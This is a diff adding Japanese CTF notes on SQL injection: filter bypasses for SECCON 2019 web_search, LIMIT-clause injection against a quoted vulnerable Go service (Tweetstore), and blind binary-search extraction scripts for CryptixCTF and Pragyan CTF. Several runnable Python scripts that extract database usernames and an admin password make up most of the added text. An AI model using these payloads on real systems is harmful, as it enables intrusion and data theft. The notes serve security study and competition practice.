@@ -424,8 +424,355 @@ for文で`user[key]=tmp[key]`のように値を代入して行く場合、`user.
 - **Prototype Pollutionの参考**  
 https://qiita.com/koki-sato/items/7b78f9ec139230b95beb  
 https://jovi0608.hatenablog.com/entry/2018/10/19/083725  
-## 
+## bypass filtering space 'or' '|' ',' (SECCON CTF 2019 予選 web_search)
+https://kinako-mochimochi.hatenablog.com/entry/2019/10/20/203747  
+https://st98.github.io/diary/posts/2019-10-20-seccon-online-ctf.html  
 - **entrypoint**  
+` `,`or`,`!`,`,`,`|`,`%`が使えないらしい。  
+` `は`/**/`やタブ文字や改行、`or`は`oorr`(再帰的に削除していないから)、`,`は`join`で制限を回避！  
+```txt
+sqlite> select 1, 2, 3 union select * from (select 4) a join (select 5) b join (select 6) c;
+1|2|3
+4|5|6
+```
+`'oorr(1);#`を入力すれば、`' or 1;#`と同じことができるらしい。ただこれだと今回はダメで「flagテーブルにFlagがある」というメッセージがでる。  
+`neko'union/**/select*from(select/**/1)a/**/join(select/**/column_name/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flag')b/**/join(select/**/3)c;#`で`piece`というカラム名を取得。  
+`neko'union/**/select*from(select/**/1)a/**/join(select/**/piece/**/from/**/flag)b/**/join(select/**/3)c;#`でFlagが出る！  
+- **payload**  
+`neko'union/**/select*from(select/**/1)a/**/join(select/**/piece/**/from/**/flag)b/**/join(select/**/3)c;#`  
+## inject in limit (SECCON beginners CTF 2020 Tweetstore)
+https://lorse.hatenablog.com/entry/2020/05/24/172016  
+- **entrypoint**  
+配布されたGoLangのソースは以下の通り。  
+DBにはpostgresを使っており、User名がFlagになっているとわかる。SQLを組み立てるあたりでSQLInjectionができうる。  
+```go
+package main
+
+import (
+    "context"
+    "fmt"
+    "log"
+    "os"
+    "strings"
+    "time"
+ 
+    "database/sql"
+    "html/template"
+    "net/http"
+
+    "github.com/gorilla/handlers"
+    "github.com/gorilla/mux"
+
+    _"github.com/lib/pq"
+)
+
+var tmplPath = "./templates/"
+
+var db *sql.DB
+
+type Tweets struct {
+    Url        string
+    Text       string
+    Tweeted_at time.Time
+}
+
+func handler_index(w http.ResponseWriter, r *http.Request) {
+
+    tmpl, err := template.ParseFiles(tmplPath + "index.html")
+    if err != nil {
+        log.Fatal(err)
+    }
+
+    var sql = "select url, text, tweeted_at from tweets"
+
+    search, ok := r.URL.Query()["search"]
+    if ok {
+        sql += " where text like '%" + strings.Replace(search[0], "'", "\\'", -1) + "%'"
+    }
+
+    sql += " order by tweeted_at desc"
+
+    limit, ok := r.URL.Query()["limit"]
+    if ok && (limit[0] != "") {
+        sql += " limit " + strings.Split(limit[0], ";")[0]
+    }
+
+    var data []Tweets
+
+
+    ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
+    defer cancel()
+
+    rows, err := db.QueryContext(ctx, sql)
+    if err != nil{
+        http.Error(w, http.StatusText(500), 500)
+        return
+    }
+
+    for rows.Next() {
+        var text string
+        var url string
+        var tweeted_at time.Time
+
+        err := rows.Scan(&url, &text, &tweeted_at)
+        if err != nil {
+            http.Error(w, http.StatusText(500), 500)
+            return
+        }
+        data = append(data, Tweets{url, text, tweeted_at})
+    }
+
+    tmpl.Execute(w, data)
+}
+
+func initialize() {
+    var err error
+
+    dbname := "ctf"
+    dbuser := os.Getenv("FLAG")
+    dbpass := "password"
+
+    connInfo := fmt.Sprintf("port=%d host=%s user=%s password=%s dbname=%s sslmode=disable", 5432, "db", dbuser, dbpass, dbname)
+    db, err = sql.Open("postgres", connInfo)
+    if err != nil {
+        log.Fatal(err)
+    }
+}
+
+func main() {
+
+    initialize()
+
+    r := mux.NewRouter()
+    r.HandleFunc("/", handler_index).Methods("GET")
+
+    http.Handle("/", r)
+    http.ListenAndServe(":8080", handlers.LoggingHandler(os.Stdout, http.DefaultServeMux))
+}
+```
+`search`では`'`を`\'`にエスケープしているが、`limit`ではしていないため、limit句にInjectできる場合のSQLInjectionテクニックが使える。  
+ちなみに、`search`に`\`を挿入しても`'%\%'`となるので今回は`'\'`でバイパスするやつとは違う。残念。  
+```go
+var sql = "select url, text, tweeted_at from tweets"
+
+search, ok := r.URL.Query()["search"]
+if ok {
+    sql += " where text like '%" + strings.Replace(search[0], "'", "\\'", -1) + "%'"
+}
+
+sql += " order by tweeted_at desc"
+
+limit, ok := r.URL.Query()["limit"]
+if ok && (limit[0] != "") {
+    sql += " limit " + strings.Split(limit[0], ";")[0]
+}
+```
+`pg_user`テーブルのusernameの一文字目が`c`なら、`limit 1`、そうじゃないなら`limit 0`で何も返されない。(0行返すという意味)  
+```txt
+limit=(CASE WHEN (SELECT ascii(substr(usename, 0, 1)) FROM pg_user LIMIT 1) = 99 THEN 1 ELSE 0 END)
+```
+- **payload**  
+`limit=(CASE WHEN (SELECT ascii(substr(usename, 0, 1)) FROM pg_user LIMIT 1) = 99 THEN 1 ELSE 0 END)`  
+```python
+import requests
+
+
+def judge(html):
+    return "1 of 200 tweets are displayed. enjoy" in html
+
+
+url = "http://tweetstore.quals.beginners.seccon.jp"
+
+
+def leak_usename():
+    leak = ""
+    for j in range(1, 1000):
+        for i in range(126, 32, -1):
+            buf = f"(CASE WHEN (SELECT ascii(substr(usename, {j}, 1)) FROM pg_user LIMIT 1 OFFSET 1) = {i} THEN 1 ELSE 0 END)"
+            params = {"search": "a", "limit": buf}
+            print(buf)
+            res = requests.get(url, params=params)
+            if judge(res.text):
+                leak += chr(i)
+                print(f"[+] now:{leak}")
+                break
+        if len(leak) != j:
+            print(f"[*] {leak}")
+            break
+
+leak_usename()
+```
+## blind injection / binary search (CryptixCTF'19 Writeup - Pure Magic)
+https://graneed.hatenablog.com/entry/2019/10/13/214515  
+- **entrypoint**  
+passphraseを入力するフォームで`' or 1=1#`を入力すると、`SELECT * FROM data where password='XXXXX'`を特定するというヒントが出る。  
+以下の普通のbinary searchのBlind。 
+- **payload**  
+```python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+import requests
+import string
+import time
+URL = 'https://cryptixctf.com/web3/login.php'
+target = ""
+def trace_request(req):
+    print("[+] request start")
+    print('{}\n{}\n\n{}'.format(
+        req.method + ' ' + req.url,
+        '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
+        req.body,
+    ))
+    print("[+] request end")
+def trace_response(res):
+    print("[+] response start")
+    print('{}\n{}\n\n{}'.format(
+        res.status_code,
+        '\n'.join('{}: {}'.format(k, v) for k, v in res.headers.items()),
+        res.content,
+    ))
+    print("[+] response end")
+def challenge(offset, guess):
+    req = requests.Request(
+        'POST',
+        URL,
+        data={
+            "pwd" : "' or ASCII(SUBSTRING((select password from data limit 0, 1),{},1)) < {} #".format(offset + 1, guess)
+        }
+    )
+    prepared = req.prepare()
+    #trace_request(prepared)
+    session = requests.Session()
+    #start = time.time() # TimeBased用
+    res = session.send(prepared, allow_redirects = False)
+    #elapsed_time = time.time() - start # TimeBased用
+    #trace_response(res)
+    if "There is no flag" in res.content.decode("utf-8"):
+        return True # 取得したい文字の文字コードは予想文字の文字コードより小さい
+    else:
+        return False # 取得したい文字の文字コードは予想文字の文字コード以上
+def binarySearch(offset):
+    low = 0
+    high = 256
+    while low <= high:
+        guess = (low + high) // 2
+        is_target_lessthan_guess = challenge(offset, guess)
+        if is_target_lessthan_guess:
+            high = guess
+        else:
+            low = guess
+        if high == 1:
+            return -1
+        elif high - low == 1:
+            return low
+while True:
+    code = binarySearch(len(target))
+    if code == -1:
+        break
+    target += chr(code)
+    print("[+] target: " + target)
+print("[+] target: " + target)
+```
+## filter union / blind injection (Pragyan CTF Animal attack)
+http://ctf.publog.jp/archives/1069963262.html  
+http://kyuri.hatenablog.jp/entry/2018/03/06/182735  
+- **entrypoint**  
+`union`というキーワードが使えないらしい。普通のBlind。  
+- **payload**  
+```python
+import requests
+from bs4 import BeautifulSoup
+
+def judge(html):
+  html = BeautifulSoup(html,"lxml")
+  agent = html.find_all("div",id="agent")
+  if len(agent) == 0:
+    return False
+  return True
+
+url = "http://128.199.224.175:24000/"
+
+def leak_shema_name():
+  flag = False
+  for k in range(100):
+    if flag:
+      break
+    schema = ""
+    for j in range(1,100):
+      for i in range(126,32,-1):
+        buf = "alix' and ord(substr((select schema_name from information_schema.schemata limit "
+        buf += str(k)
+        buf += ",1),"
+        buf += str(j)
+        buf += ",1)) > "
+        buf += str(i)
+        buf += " #"
+        param = {"spy_name":buf.encode('base64')}
+        res = requests.post(url,param)
+        if judge(res.text):
+          schema += chr(i+1)
+          print "[+] now:%s" % schema
+          break
+      if len(schema) != j:
+        if len(schema) != 0:
+          print "[*] schema name:%s" % schema
+          break
+        else:
+          flag = True
+          break
+
+def leak_table_column_name():
+  leak = ""
+  for j in range(1,1000):
+    for i in range(126,32,-1):
+      buf = "alix' and ord(substr((select group_concat(table_name,':',column_name) from information_schema.columns  where table_schema LIKE 'spy_database' limit 0,1),"
+      buf += str(j)
+      buf += ",1)) > "
+      buf += str(i)
+      buf += " #"
+      param = {"spy_name":buf.encode('base64')}
+      res = requests.post(url,param)
+      if judge(res.text):
+        leak += chr(i+1)
+        print "[+] now:%s" % leak
+        break
+    if len(leak) != j:
+      print "[*] %s" % leak
+      break
+
+def leak_admins_password():
+  leak = ""
+  for j in range(1,1000):
+    for i in range(126,32,-1):
+      buf = "alix' and ord(substr((select password from users  where username LIKE 'admin' limit 0,1),"
+      buf += str(j)
+      buf += ",1)) > "
+      buf += str(i)
+      buf += " #"
+      param = {"spy_name":buf.encode('base64')}
+      res = requests.post(url,param)
+      if judge(res.text):
+        leak += chr(i+1)
+        print "[+] now:%s" % leak
+        break
+    if len(leak) != j:
+      print "[*] %s" % leak
+      break
+
+leak_schema_name()
+# schema1:information_schema
+# schema2:spy_database
+
+leak_table_column_name()
+# spies:id,spies:name,spies:age,spies:experience,spies:description,users:id,users:username,users:password,users:email
+
+leak_admins_password()
+# pctf{L31's|@Ll_h4il-1h3-c4T_Qu33n.?}
+```
+## (Securinets Prequals CTF 2019 – SQL Injected)
+https://ctftime.org/writeup/14117  
+- **entrypoint**  
+
 - **payload**  
 
 ## 
@@ -435,6 +782,11 @@ https://jovi0608.hatenablog.com/entry/2018/10/19/083725
 ## 
 - **entrypoint**  
 - **payload**  
+
+## 
+- **entrypoint**  
+- **payload**  
+
 
 # 常設の練習
 ## picoCTF 2019
